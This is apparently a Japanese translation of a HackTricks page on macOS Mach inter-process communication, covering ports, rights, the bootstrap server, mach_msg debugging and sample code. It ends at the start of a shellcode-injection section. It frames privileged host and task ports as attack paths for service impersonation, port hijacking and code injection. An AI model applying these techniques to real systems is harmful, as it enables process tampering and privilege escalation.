# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### 基本情報

Machはリソースを共有するための**最小単位**として**タスク**を使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドはPOSIXプロセスとスレッドに1:1でマッピングされます**。

タスク間の通信はMach Inter-Process Communication (IPC)を介して行われ、一方向の通信チャネルを利用します。**メッセージはポート間で転送され**、これらはカーネルによって管理される**メッセージキュー**のようなものです。

**ポート**はMach IPCの**基本的な**要素です。メッセージを**送信し、受信する**ために使用できます。

各プロセスには**IPCテーブル**があり、そこには**プロセスのmachポート**を見つけることができます。machポートの名前は実際には番号（カーネルオブジェクトへのポインタ）です。

プロセスはまた、**異なるタスク**に権利を持つポート名を送信することができ、カーネルはこのエントリを**他のタスクのIPCテーブル**に表示させます。

### ポート権限

ポート権限は、タスクが実行できる操作を定義し、この通信の鍵となります。可能な**ポート権限**は以下の通りです（[ここからの定義](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）：

- **受信権限**は、ポートに送信されたメッセージを受信することを許可します。MachポートはMPSC（複数のプロデューサー、単一のコンシューマー）キューであり、システム全体で**各ポートに対して1つの受信権限**しか存在できません（パイプとは異なり、複数のプロセスが1つのパイプの読み取り端にファイルディスクリプタを保持できます）。
- **受信権限を持つタスク**はメッセージを受信し、**送信権限を作成**することができ、メッセージを送信できます。元々は**自分のタスクのみがポートに対して受信権限を持っています**。
- 受信権限の所有者が**死亡**するか、それを殺すと、**送信権限は無効になります（デッドネーム）。**
- **送信権限**は、ポートにメッセージを送信することを許可します。
- 送信権限は**クローン**可能で、送信権限を持つタスクはその権限をクローンし、**第三のタスクに付与**できます。
- **ポート権限**はMacメッセージを介しても**渡すことができます**。
- **一度だけの送信権限**は、ポートに1つのメッセージを送信し、その後消失します。
- この権限は**クローン**できませんが、**移動**することができます。
- **ポートセット権限**は、単一のポートではなく、_ポートセット_を示します。ポートセットからメッセージをデキューすると、その中のポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、複数のポートを同時にリッスンするために使用できます。
- **デッドネーム**は実際のポート権限ではなく、単なるプレースホルダーです。ポートが破壊されると、ポートへのすべての既存のポート権限はデッドネームに変わります。

**タスクは他のタスクに送信権限を転送**でき、メッセージを返送することが可能になります。**送信権限はクローン可能で、タスクはその権限を複製して第三のタスクに与えることができます**。これにより、**ブートストラップサーバー**と呼ばれる仲介プロセスを組み合わせることで、タスク間の効果的な通信が可能になります。

### ファイルポート

ファイルポートは、Macポート内にファイルディスクリプタをカプセル化することを可能にします（Machポート権限を使用）。`fileport_makeport`を使用して指定されたFDから`fileport`を作成し、`fileport_makefd`を使用してファイルポートからFDを作成することができます。

### 通信の確立

前述のように、Machメッセージを使用して権限を送信することは可能ですが、**Machメッセージを送信する権限を持っていないと権限を送信することはできません**。では、最初の通信はどのように確立されるのでしょうか？

これには、**ブートストラップサーバー**（macでは**launchd**）が関与します。**誰でもブートストラップサーバーに送信権限を取得できるため**、他のプロセスにメッセージを送信する権限を要求することが可能です：

1. タスク**A**が**新しいポート**を作成し、その上で**受信権限**を取得します。
2. タスク**A**は、受信権限の保持者として、**ポートの送信権限を生成**します。
3. タスク**A**は**ブートストラップサーバー**との**接続**を確立し、最初に生成したポートの**送信権限を送信**します。
- 誰でもブートストラップサーバーに送信権限を取得できることを忘れないでください。
4. タスクAは、ブートストラップサーバーに`bootstrap_register`メッセージを送信して、**指定されたポートに名前を関連付けます**（例：`com.apple.taska`）。
5. タスク**B**は、ブートストラップサーバーと対話してサービス名のブートストラップ**ルックアップ**を実行します（`bootstrap_lookup`）。ブートストラップサーバーが応答できるように、タスクBはルックアップメッセージ内で**以前に作成したポートへの送信権限**を送信します。ルックアップが成功すると、**サーバーはタスクAから受け取った送信権限を複製し、タスクBに**転送します。
- 誰でもブートストラップサーバーに送信権限を取得できることを忘れないでください。
6. この送信権限を持って、**タスクB**は**タスクAにメッセージを送信**することができます。
7. 双方向通信のために、通常タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、タスクAに**送信権限を与えて**タスクBにメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバーは、タスクが主張するサービス名を**認証できません**。これは、**タスク**が任意のシステムタスクを**偽装する可能性がある**ことを意味します。たとえば、偽の**認証サービス名を主張し、すべてのリクエストを承認する**ことができます。

その後、Appleは**システム提供サービスの名前**を安全な構成ファイルに保存し、**SIP保護された**ディレクトリに配置します：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`。各サービス名に関連付けられた**バイナリも保存されます**。ブートストラップサーバーは、これらのサービス名の**受信権限を作成し保持します**。

これらの事前定義されたサービスについては、**ルックアッププロセスがわずかに異なります**。サービス名がルックアップされると、launchdはサービスを動的に開始します。新しいワークフローは次のようになります：

- タスク**B**がサービス名のブートストラップ**ルックアップ**を開始します。
- **launchd**はタスクが実行中かどうかを確認し、実行されていない場合は**開始**します。
- タスク**A**（サービス）は**ブートストラップチェックイン**（`bootstrap_check_in()`）を実行します。ここで、**ブートストラップ**サーバーは送信権限を作成し、それを保持し、**受信権限をタスクAに転送します**。
- launchdは**送信権限を複製し、タスクBに送信します**。
- タスク**B**は**受信**権限と**送信**権限を持つ新しいポートを生成し、タスクA（svc）に**送信権限を与えて**タスクBにメッセージを送信できるようにします（双方向通信）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは元の説明のように動作し続け、偽装を許可する可能性があります。

> [!CAUTION]
> したがって、launchdは決してクラッシュしてはいけません。そうでないと、システム全体がクラッシュします。

### Machメッセージ

[こちらで詳細情報を見つけてください](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg`関数は、実質的にシステムコールであり、Machメッセージの送信と受信に使用されます。この関数は、最初の引数として送信されるメッセージを必要とします。このメッセージは、`mach_msg_header_t`構造体で始まり、その後に実際のメッセージ内容が続きます。この構造体は次のように定義されています：
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
プロセスが _**受信権**_ を持っている場合、Machポートでメッセージを受信できます。逆に、**送信者**には _**送信**_ または _**一度だけ送信権**_ が付与されます。一度だけ送信権は、単一のメッセージを送信するためのもので、その後は無効になります。

初期フィールド **`msgh_bits`** はビットマップです：

- 最初のビット（最も重要なビット）は、メッセージが複雑であることを示すために使用されます（詳細は以下）。
- 3番目と4番目はカーネルによって使用されます。
- 2バイト目の **5つの最下位ビット** は **バウチャー** に使用できます：キー/値の組み合わせを送信するための別のタイプのポートです。
- 3バイト目の **5つの最下位ビット** は **ローカルポート** に使用できます。
- 4バイト目の **5つの最下位ビット** は **リモートポート** に使用できます。

バウチャー、ローカルポート、リモートポートで指定できるタイプは次のとおりです（[**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html) から）：
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
例えば、`MACH_MSG_TYPE_MAKE_SEND_ONCE`は、このポートのために**送信一次権利**を導出し、転送することを**示す**ために使用できます。また、受信者が返信できないようにするために`MACH_PORT_NULL`を指定することもできます。

簡単な**双方向通信**を実現するために、プロセスは**返信ポート**（**`msgh_local_port`**）と呼ばれるmach **メッセージヘッダー**内の**machポート**を指定することができ、メッセージの**受信者**はこのメッセージに**返信**を送信できます。

> [!TIP]
> この種の双方向通信は、再生を期待するXPCメッセージ（`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`）で使用されることに注意してください。しかし、**通常は異なるポートが作成され**、前述のように双方向通信を作成します。

メッセージヘッダーの他のフィールドは次のとおりです：

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信されるポート。
- `msgh_voucher_port`: [machバウチャー](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`: このメッセージのIDで、受信者によって解釈されます。

> [!CAUTION]
> **machメッセージは`machポート`を介して送信される**ことに注意してください。これは**単一受信者**、**複数送信者**の通信チャネルで、machカーネルに組み込まれています。**複数のプロセス**がmachポートに**メッセージを送信**できますが、いつでも**単一のプロセスのみが**そこから読み取ることができます。

メッセージは、**`mach_msg_header_t`**ヘッダーの後に**本体**、および**トレーラー**（ある場合）で構成され、返信の許可を与えることができます。この場合、カーネルはメッセージを一つのタスクから別のタスクに渡すだけで済みます。

**トレーラー**は、カーネルによってメッセージに**追加される情報**（ユーザーによって設定できない）で、フラグ`MACH_RCV_TRAILER_<trailer_opt>`を使用してメッセージ受信時に要求できます（要求できる情報は異なります）。

#### 複雑なメッセージ

ただし、追加のポート権を渡したり、メモリを共有したりするような、より**複雑な**メッセージもあります。この場合、カーネルはこれらのオブジェクトを受信者に送信する必要があります。この場合、ヘッダーの最上位ビット`msgh_bits`が設定されます。

渡す可能な記述子は、[**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)で定義されています：
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32ビットでは、すべてのディスクリプタは12Bで、ディスクリプタタイプは11番目にあります。64ビットでは、サイズが異なります。

> [!CAUTION]
> カーネルは、あるタスクから別のタスクにディスクリプタをコピーしますが、最初に**カーネルメモリにコピーを作成します**。この技術は「風水」として知られ、いくつかのエクスプロイトで悪用され、**カーネルがそのメモリにデータをコピーする**ことを可能にし、プロセスが自分自身にディスクリプタを送信します。その後、プロセスはメッセージを受信できます（カーネルがそれらを解放します）。
>
> また、**脆弱なプロセスにポート権を送信する**ことも可能で、ポート権はプロセスに表示されます（たとえそのプロセスがそれらを処理していなくても）。

### Mac Ports APIs

ポートはタスクネームスペースに関連付けられているため、ポートを作成または検索するには、タスクネームスペースもクエリされます（`mach/mach_port.h`の詳細）：

- **`mach_port_allocate` | `mach_port_construct`**: **ポートを作成**します。
- `mach_port_allocate`は**ポートセット**も作成できます：ポートのグループに対する受信権。メッセージが受信されると、どのポートから受信されたかが示されます。
- `mach_port_allocate_name`: ポートの名前を変更します（デフォルトは32ビット整数）。
- `mach_port_names`: ターゲットからポート名を取得します。
- `mach_port_type`: 名前に対するタスクの権利を取得します。
- `mach_port_rename`: ポートの名前を変更します（FDのdup2のように）。
- `mach_port_allocate`: 新しいRECEIVE、PORT_SETまたはDEAD_NAMEを割り当てます。
- `mach_port_insert_right`: RECEIVEを持つポートに新しい権利を作成します。
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: **machメッセージを送受信するために使用される関数**。上書きバージョンでは、メッセージ受信のために異なるバッファを指定できます（他のバージョンはそれを再利用します）。

### Debug mach_msg

**`mach_msg`**および**`mach_msg_overwrite`**関数はメッセージを送受信するために使用されるため、これらにブレークポイントを設定すると、送信されたメッセージと受信されたメッセージを検査できます。

たとえば、デバッグ可能な任意のアプリケーションのデバッグを開始すると、**`libSystem.B`がロードされ、この関数を使用します**。

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

**`mach_msg`**の引数を取得するには、レジスタを確認します。これらが引数です（[mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)から）：
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
レジストリから値を取得します:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
メッセージヘッダーを検査し、最初の引数を確認します:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
そのタイプの `mach_msg_bits_t` は、応答を許可するために非常に一般的です。

### ポートの列挙
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**名前**はポートに与えられたデフォルトの名前です（最初の3バイトでどのように**増加**しているかを確認してください）。**`ipc-object`**はポートの**難読化された**一意の**識別子**です。\
また、**`send`**権限のみを持つポートがその所有者（ポート名 + pid）を**識別している**ことにも注意してください。\
さらに、**`+`**を使用して**同じポートに接続された他のタスク**を示していることにも注意してください。

また、[**procesxp**](https://www.newosxbook.com/tools/procexp.html)を使用して、**登録されたサービス名**（`com.apple.system-task-port`の必要性によりSIPが無効になっている場合）も確認できます。
```
procesp 1 ports
```
このツールは、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてiOSにインストールできます。

### コード例

**送信者**がポートを**割り当て**、名前 `org.darlinghq.example` のための**送信権**を作成し、それを**ブートストラップサーバー**に送信する様子に注意してください。送信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**しました。

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 特権ポート

特定の敏感なアクションを実行したり、特定の敏感なデータにアクセスしたりすることを可能にする特別なポートがあります。タスクがそれらに対して**SEND**権限を持っている場合、これらのポートは攻撃者の視点から非常に興味深いものとなります。なぜなら、機能だけでなく、タスク間で**SEND権限を共有する**ことが可能だからです。

### ホスト特別ポート

これらのポートは番号で表されます。

**SEND**権利は**`host_get_special_port`**を呼び出すことで取得でき、**RECEIVE**権利は**`host_set_special_port`**を呼び出すことで取得できます。しかし、両方の呼び出しには**`host_priv`**ポートが必要で、これはルートのみがアクセスできます。さらに、過去にはルートが**`host_set_special_port`**を呼び出して任意のポートをハイジャックでき、例えば`HOST_KEXTD_PORT`をハイジャックすることでコード署名をバイパスすることができました（現在はSIPがこれを防止しています）。

これらは2つのグループに分かれています：**最初の7つのポートはカーネルによって所有され**、1が`HOST_PORT`、2が`HOST_PRIV_PORT`、3が`HOST_IO_MASTER_PORT`、7が`HOST_MAX_SPECIAL_KERNEL_PORT`です。\
番号**8**から始まるものは**システムデーモンによって所有され**、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html)に宣言されています。

- **ホストポート**：プロセスがこのポートに対して**SEND**権限を持っている場合、次のようなルーチンを呼び出すことで**システム**に関する**情報**を取得できます：
  - `host_processor_info`: プロセッサ情報を取得
  - `host_info`: ホスト情報を取得
  - `host_virtual_physical_table_info`: 仮想/物理ページテーブル（MACH_VMDEBUGが必要）
  - `host_statistics`: ホスト統計を取得
  - `mach_memory_info`: カーネルメモリレイアウトを取得
- **ホストプライベートポート**：このポートに対して**SEND**権限を持つプロセスは、ブートデータを表示したり、カーネル拡張を読み込もうとしたりする**特権アクション**を実行できます。この権限を取得するには**プロセスがルートである必要があります**。
- さらに、**`kext_request`** APIを呼び出すには、他の権限**`com.apple.private.kext*`**が必要で、これはAppleのバイナリにのみ付与されます。
- 呼び出すことができる他のルーチンは次のとおりです：
  - `host_get_boot_info`: `machine_boot_info()`を取得
  - `host_priv_statistics`: 特権統計を取得
  - `vm_allocate_cpm`: 連続物理メモリを割り当て
  - `host_processors`: ホストプロセッサへの送信権
  - `mach_vm_wire`: メモリを常駐させる
- **ルート**はこの権限にアクセスできるため、`host_set_[special/exception]_port[s]`を呼び出して**ホスト特別または例外ポートをハイジャック**することができます。

すべてのホスト特別ポートを表示するには、次のコマンドを実行します：
```bash
procexp all ports | grep "HSP"
```
### タスク特別ポート

これらは、よく知られたサービスのために予約されたポートです。`task_[get/set]_special_port`を呼び出すことで取得/設定することが可能です。これらは`task_special_ports.h`にあります：
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
- **TASK_KERNEL_PORT**\[task-self send right]: このタスクを制御するために使用されるポート。タスクに影響を与えるメッセージを送信するために使用されます。これは**mach_task_self**によって返されるポートです（下記のタスクポートを参照）。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: タスクのブートストラップポート。その他のシステムサービスポートの返却を要求するメッセージを送信するために使用されます。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 含まれるホストの情報を要求するために使用されるポート。これは**mach_host_self**によって返されるポートです。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: このタスクがそのワイヤードカーネルメモリを引き出すソースを指定するポート。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: このタスクがそのデフォルトのメモリ管理メモリを引き出すソースを指定するポート。

### タスクポート

元々Machには「プロセス」はなく、「タスク」があり、これはスレッドのコンテナのように考えられていました。MachがBSDと統合されたとき、**各タスクはBSDプロセスに関連付けられました**。したがって、すべてのBSDプロセスはプロセスとして必要な詳細を持ち、すべてのMachタスクもその内部動作を持っています（存在しないpid 0は`kernel_task`です）。

これに関連する非常に興味深い関数が2つあります：

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 指定された`pid`に関連するタスクのタスクポートのSEND権を取得し、指定された`target_task_port`に渡します（通常は`mach_task_self()`を使用した呼び出しタスクですが、異なるタスクのSENDポートである可能性もあります）。
- `pid_for_task(task, &pid)`: タスクへのSEND権を与えられた場合、このタスクが関連するPIDを見つけます。

タスク内でアクションを実行するためには、タスクは`mach_task_self()`を呼び出して自分自身への`SEND`権を必要としました（これは`task_self_trap`（28）を使用します）。この権限があれば、タスクは以下のようなさまざまなアクションを実行できます：

- `task_threads`: タスクのスレッドのすべてのタスクポートに対するSEND権を取得
- `task_info`: タスクに関する情報を取得
- `task_suspend/resume`: タスクを一時停止または再開
- `task_[get/set]_special_port`
- `thread_create`: スレッドを作成
- `task_[get/set]_state`: タスクの状態を制御
- その他の詳細は[**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)で見つけることができます。

> [!CAUTION]
> 異なるタスクのタスクポートに対するSEND権を持つ場合、異なるタスクに対してそのようなアクションを実行することが可能です。

さらに、task_portは**`vm_map`**ポートでもあり、`vm_read()`や`vm_write()`などの関数を使用してタスク内のメモリを**読み取りおよび操作**することを可能にします。これは基本的に、異なるタスクのtask_portに対するSEND権を持つタスクがそのタスクに**コードを注入する**ことができることを意味します。

**カーネルもタスクであるため**、誰かが**`kernel_task`**に対する**SEND権限**を取得できれば、カーネルに何でも実行させることができます（脱獄）。

- `mach_task_self()`を呼び出して、呼び出しタスクのこのポートの**名前を取得**します。このポートは**`exec()`**を通じてのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリの`exec()`後にタスクも新しいタスクポートを取得します）。タスクを生成し、そのポートを取得する唯一の方法は、`fork()`を行いながら["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html)を実行することです。
- ポートへのアクセス制限は以下の通りです（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）：
- アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスはタスクポートにアクセスできます**（通常はデバッグのためにXcodeによって追加されます）。**ノータリゼーション**プロセスは、製品リリースではこれを許可しません。
- **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得できます**。古いバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
- **ルートは**、**ハードンされた**ランタイムでコンパイルされていないアプリケーションのタスクポートにアクセスできます（Appleからではありません）。

**タスク名ポート:** _タスクポート_の特権のないバージョン。タスクを参照しますが、制御することはできません。これを通じて利用可能な唯一のものは`task_info()`のようです。

### スレッドポート

スレッドにも関連するポートがあり、これは**`task_threads`**を呼び出すタスクや`processor_set_threads`を持つプロセッサから見ることができます。スレッドポートへのSEND権は、`thread_act`サブシステムの関数を使用することを可能にします：

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任意のスレッドは**`mach_thread_sef`**を呼び出すことでこのポートを取得できます。

### タスクポート経由のスレッドへのシェルコード注入

シェルコードを取得することができます：

{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
